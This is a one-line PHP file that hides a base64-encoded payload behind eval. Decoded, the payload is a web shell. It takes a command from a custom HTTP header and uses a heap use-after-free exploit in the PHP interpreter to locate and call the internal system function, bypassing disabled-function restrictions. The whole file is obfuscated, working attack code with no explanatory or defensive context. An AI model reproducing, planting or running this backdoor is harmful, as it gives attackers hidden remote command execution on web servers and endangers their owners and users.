<?php eval(base64_decode("bmV3IFB3bihiYXNlNjRfZGVjb2RlKCRfU0VSVkVSWydIVFRQX0FJWkFXQV9OSU5KQSddKSk7CgpjbGFzcyBIZWxwZXIgeyBwdWJsaWMgJGEsICRiLCAkYzsgfQpjbGFzcyBQd24gewogICAgY29uc3QgTE9HR0lORyA9IGZhbHNlOwogICAgY29uc3QgQ0hVTktfREFUQV9TSVpFID0gMHg2MDsKICAgIGNvbnN0IENIVU5LX1NJWkUgPSBaRU5EX0RFQlVHX0JVSUxEID8gc2VsZjo6Q0hVTktfREFUQV9TSVpFICsgMHgyMCA6IHNlbGY6OkNIVU5LX0RBVEFfU0laRTsKICAgIGNvbnN0IFNUUklOR19TSVpFID0gc2VsZjo6Q0hVTktfREFUQV9TSVpFIC0gMHgxOCAtIDE7CgogICAgY29uc3QgSFRfU0laRSA9IDB4MTE4OwogICAgY29uc3QgSFRfU1RSSU5HX1NJWkUgPSBzZWxmOjpIVF9TSVpFIC0gMHgxOCAtIDE7CgogICAgcHVibGljIGZ1bmN0aW9uIF9fY29uc3RydWN0KCRjbWQpIHsKICAgICAgICBmb3IoJGkgPSAwOyAkaSA8IDEwOyAkaSsrKSB7CiAgICAgICAgICAgICRncm9vbVtdID0gc2VsZjo6YWxsb2Moc2VsZjo6U1RSSU5HX1NJWkUpOwogICAgICAgICAgICAkZ3Jvb21bXSA9IHNlbGY6OmFsbG9jKHNlbGY6OkhUX1NUUklOR19TSVpFKTsKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgJGNvbmNhdF9zdHJfYWRkciA9IHNlbGY6OnN0cjJwdHIoJHRoaXMtPmhlYXBfbGVhaygpLCAxNik7CiAgICAgICAgJGZpbGwgPSBzZWxmOjphbGxvYyhzZWxmOjpTVFJJTkdfU0laRSk7CgogICAgICAgICR0aGlzLT5hYmMgPSBzZWxmOjphbGxvYyhzZWxmOjpTVFJJTkdfU0laRSk7CiAgICAgICAgJGFiY19hZGRyID0gJGNvbmNhdF9zdHJfYWRkciArIHNlbGY6OkNIVU5LX1NJWkU7CiAgICAgICAgc2VsZjo6bG9nKCJhYmMgQCAweCV4IiwgJGFiY19hZGRyKTsKCiAgICAgICAgJHRoaXMtPmZyZWUoJGFiY19hZGRyKTsKICAgICAgICAkdGhpcy0+aGVscGVyID0gbmV3IEhlbHBlcjsKICAgICAgICBpZihzdHJsZW4oJHRoaXMtPmFiYykgPCAweDEzMzcpIHsKICAgICAgICAgICAgc2VsZjo6bG9nKCJ1YWYgZmFpbGVkIik7CiAgICAgICAgICAgIHJldHVybjsKICAgICAgICB9CgogICAgICAgICR0aGlzLT5oZWxwZXItPmEgPSAibGVldCI7CiAgICAgICAgJHRoaXMtPmhlbHBlci0+YiA9IGZ1bmN0aW9uKCR4KSB7fTsKICAgICAgICAkdGhpcy0+aGVscGVyLT5jID0gMHhmZWVkZmFjZTsKCiAgICAgICAgJGhlbHBlcl9oYW5kbGVycyA9ICR0aGlzLT5yZWxfcmVhZCgwKTsKICAgICAgICBzZWxmOjpsb2coImhlbHBlciBoYW5kbGVycyBAIDB4JXgiLCAkaGVscGVyX2hhbmRsZXJzKTsKCiAgICAgICAgJGNsb3N1cmVfYWRkciA9ICR0aGlzLT5yZWxfcmVhZCgweDIwKTsKICAgICAgICBzZWxmOjpsb2coInJlYWwgY2xvc3VyZSBAIDB4JXgiLCAkY2xvc3VyZV9hZGRyKTsKCiAgICAgICAgJGNsb3N1cmVfY2UgPSAkdGhpcy0+cmVhZCgkY2xvc3VyZV9hZGRyICsgMHgxMCk7CiAgICAgICAgc2VsZjo6bG9nKCJjbG9zdXJlIGNsYXNzX2VudHJ5IEAgMHgleCIsICRjbG9zdXJlX2NlKTsKICAgICAgICAKICAgICAgICAkYmFzaWNfZnVuY3MgPSAkdGhpcy0+Z2V0X2Jhc2ljX2Z1bmNzKCRjbG9zdXJlX2NlKTsKICAgICAgICBzZWxmOjpsb2coImJhc2ljX2Z1bmN0aW9ucyBAIDB4JXgiLCAkYmFzaWNfZnVuY3MpOwoKICAgICAgICAkemlmX3N5c3RlbSA9ICR0aGlzLT5nZXRfc3lzdGVtKCRiYXNpY19mdW5jcyk7CiAgICAgICAgc2VsZjo6bG9nKCJ6aWZfc3lzdGVtIEAgMHgleCIsICR6aWZfc3lzdGVtKTsKCiAgICAgICAgJGZha2VfY2xvc3VyZV9vZmYgPSAweDcwOwogICAgICAgIGZvcigkaSA9IDA7ICRpIDwgMHgxMzg7ICRpICs9IDgpIHsKICAgICAgICAgICAgJHRoaXMtPnJlbF93cml0ZSgkZmFrZV9jbG9zdXJlX29mZiArICRpLCAkdGhpcy0+cmVhZCgkY2xvc3VyZV9hZGRyICsgJGkpKTsKICAgICAgICB9CiAgICAgICAgJHRoaXMtPnJlbF93cml0ZSgkZmFrZV9jbG9zdXJlX29mZiArIDB4MzgsIDEsIDQpOwogICAgICAgICRoYW5kbGVyX29mZnNldCA9IFBIUF9NQUpPUl9WRVJTSU9OID09PSA4ID8gMHg3MCA6IDB4Njg7CiAgICAgICAgJHRoaXMtPnJlbF93cml0ZSgkZmFrZV9jbG9zdXJlX29mZiArICRoYW5kbGVyX29mZnNldCwgJHppZl9zeXN0ZW0pOwoKICAgICAgICAkZmFrZV9jbG9zdXJlX2FkZHIgPSAkYWJjX2FkZHIgKyAkZmFrZV9jbG9zdXJlX29mZiArIDB4MTg7CiAgICAgICAgc2VsZjo6bG9nKCJmYWtlIGNsb3N1cmUgQCAweCV4IiwgJGZha2VfY2xvc3VyZV9hZGRyKTsKCiAgICAgICAgJHRoaXMtPnJlbF93cml0ZSgweDIwLCAkZmFrZV9jbG9zdXJlX2FkZHIpOwogICAgICAgICgkdGhpcy0+aGVscGVyLT5iKSgkY21kKTsKCiAgICAgICAgJHRoaXMtPnJlbF93cml0ZSgweDIwLCAkY2xvc3VyZV9hZGRyKTsKICAgICAgICB1bnNldCgkdGhpcy0+aGVscGVyLT5iKTsKICAgIH0KCiAgICBwcml2YXRlIGZ1bmN0aW9uIGhlYXBfbGVhaygpIHsKICAgICAgICAkYXJyID0gW1tdLCBbXV07CiAgICAgICAgc2V0X2Vycm9yX2hhbmRsZXIoZnVuY3Rpb24oKSB1c2UgKCYkYXJyLCAmJGJ1ZikgewogICAgICAgICAgICAkYXJyID0gMTsKICAgICAgICAgICAgJGJ1ZiA9IHN0cl9yZXBlYXQoIlx4MDAiLCBzZWxmOjpIVF9TVFJJTkdfU0laRSk7CiAgICAgICAgfSk7CiAgICAgICAgJGFyclsxXSAuPSBzZWxmOjphbGxvYyhzZWxmOjpTVFJJTkdfU0laRSAtIHN0cmxlbigiQXJyYXkiKSk7CiAgICAgICAgcmV0dXJuICRidWY7CiAgICB9CgogICAgcHJpdmF0ZSBmdW5jdGlvbiBmcmVlKCRhZGRyKSB7CiAgICAgICAgJHBheWxvYWQgPSBwYWNrKCJRKiIsIDB4ZGVhZGJlZWYsIDB4Y2FmZWJhYmUsICRhZGRyKTsKICAgICAgICAkcGF5bG9hZCAuPSBzdHJfcmVwZWF0KCJBIiwgc2VsZjo6SFRfU1RSSU5HX1NJWkUgLSBzdHJsZW4oJHBheWxvYWQpKTsKICAgICAgICAKICAgICAgICAkYXJyID0gW1tdLCBbXV07CiAgICAgICAgc2V0X2Vycm9yX2hhbmRsZXIoZnVuY3Rpb24oKSB1c2UgKCYkYXJyLCAmJGJ1ZiwgJiRwYXlsb2FkKSB7CiAgICAgICAgICAgICRhcnIgPSAxOwogICAgICAgICAgICAkYnVmID0gc3RyX3JlcGVhdCgkcGF5bG9hZCwgMSk7CiAgICAgICAgfSk7CiAgICAgICAgJGFyclsxXSAuPSAieCI7CiAgICB9CgogICAgcHJpdmF0ZSBmdW5jdGlvbiByZWxfcmVhZCgkb2Zmc2V0KSB7CiAgICAgICAgcmV0dXJuIHNlbGY6OnN0cjJwdHIoJHRoaXMtPmFiYywgJG9mZnNldCk7CiAgICB9CgogICAgcHJpdmF0ZSBmdW5jdGlvbiByZWxfd3JpdGUoJG9mZnNldCwgJHZhbHVlLCAkbiA9IDgpIHsKICAgICAgICBmb3IgKCRpID0gMDsgJGkgPCAkbjsgJGkrKykgewogICAgICAgICAgICAkdGhpcy0+YWJjWyRvZmZzZXQgKyAkaV0gPSBjaHIoJHZhbHVlICYgMHhmZik7CiAgICAgICAgICAgICR2YWx1ZSA+Pj0gODsKICAgICAgICB9CiAgICB9CgogICAgcHJpdmF0ZSBmdW5jdGlvbiByZWFkKCRhZGRyLCAkbiA9IDgpIHsKICAgICAgICAkdGhpcy0+cmVsX3dyaXRlKDB4MTAsICRhZGRyIC0gMHgxMCk7CiAgICAgICAgJHZhbHVlID0gc3RybGVuKCR0aGlzLT5oZWxwZXItPmEpOwogICAgICAgIGlmKCRuICE9PSA4KSB7ICR2YWx1ZSAmPSAoMSA8PCAoJG4gPDwgMykpIC0gMTsgfQogICAgICAgIHJldHVybiAkdmFsdWU7CiAgICB9CgogICAgcHJpdmF0ZSBmdW5jdGlvbiBnZXRfc3lzdGVtKCRiYXNpY19mdW5jcykgewogICAgICAgICRhZGRyID0gJGJhc2ljX2Z1bmNzOwogICAgICAgIGRvIHsKICAgICAgICAgICAgJGZfZW50cnkgPSAkdGhpcy0+cmVhZCgkYWRkcik7CiAgICAgICAgICAgICRmX25hbWUgPSAkdGhpcy0+cmVhZCgkZl9lbnRyeSwgNik7CiAgICAgICAgICAgIGlmKCRmX25hbWUgPT09IDB4NmQ2NTc0NzM3OTczKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gJHRoaXMtPnJlYWQoJGFkZHIgKyA4KTsKICAgICAgICAgICAgfQogICAgICAgICAgICAkYWRkciArPSAweDIwOwogICAgICAgIH0gd2hpbGUoJGZfZW50cnkgIT09IDApOwogICAgfQoKICAgIHByaXZhdGUgZnVuY3Rpb24gZ2V0X2Jhc2ljX2Z1bmNzKCRhZGRyKSB7CiAgICAgICAgd2hpbGUodHJ1ZSkgewogICAgICAgICAgICAkYWRkciAtPSAweDEwOwogICAgICAgICAgICBpZigkdGhpcy0+cmVhZCgkYWRkciwgNCkgPT09IDB4QTggJiYKICAgICAgICAgICAgICAgIGluX2FycmF5KCR0aGlzLT5yZWFkKCRhZGRyICsgNCwgNCksCiAgICAgICAgICAgICAgICAgICAgWzIwMTgwNzMxLCAyMDE5MDkwMiwgMjAyMDA5MzAsIDIwMjEwOTAyXSkpIHsKICAgICAgICAgICAgICAgICRtb2R1bGVfbmFtZV9hZGRyID0gJHRoaXMtPnJlYWQoJGFkZHIgKyAweDIwKTsKICAgICAgICAgICAgICAgICRtb2R1bGVfbmFtZSA9ICR0aGlzLT5yZWFkKCRtb2R1bGVfbmFtZV9hZGRyKTsKICAgICAgICAgICAgICAgIGlmKCRtb2R1bGVfbmFtZSA9PT0gMHg2NDcyNjE2NDZlNjE3NDczKSB7CiAgICAgICAgICAgICAgICAgICAgc2VsZjo6bG9nKCJzdGFuZGFyZCBtb2R1bGUgQCAweCV4IiwgJGFkZHIpOwogICAgICAgICAgICAgICAgICAgIHJldHVybiAkdGhpcy0+cmVhZCgkYWRkciArIDB4MjgpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQoKICAgIHByaXZhdGUgZnVuY3Rpb24gbG9nKCRmb3JtYXQsICR2YWwgPSAiIikgewogICAgICAgIGlmKHNlbGY6OkxPR0dJTkcpIHsKICAgICAgICAgICAgcHJpbnRmKCJ7JGZvcm1hdH1cbiIsICR2YWwpOwogICAgICAgIH0KICAgIH0KCiAgICBzdGF0aWMgZnVuY3Rpb24gYWxsb2MoJHNpemUpIHsKICAgICAgICByZXR1cm4gc3RyX3NodWZmbGUoc3RyX3JlcGVhdCgiQSIsICRzaXplKSk7CiAgICB9CgogICAgc3RhdGljIGZ1bmN0aW9uIHN0cjJwdHIoJHN0ciwgJHAgPSAwLCAkbiA9IDgpIHsKICAgICAgICAkYWRkcmVzcyA9IDA7CiAgICAgICAgZm9yKCRqID0gJG4gLSAxOyAkaiA+PSAwOyAkai0tKSB7CiAgICAgICAgICAgICRhZGRyZXNzIDw8PSA4OwogICAgICAgICAgICAkYWRkcmVzcyB8PSBvcmQoJHN0clskcCArICRqXSk7CiAgICAgICAgfQogICAgICAgIHJldHVybiAkYWRkcmVzczsKICAgIH0KfQ==")); ?>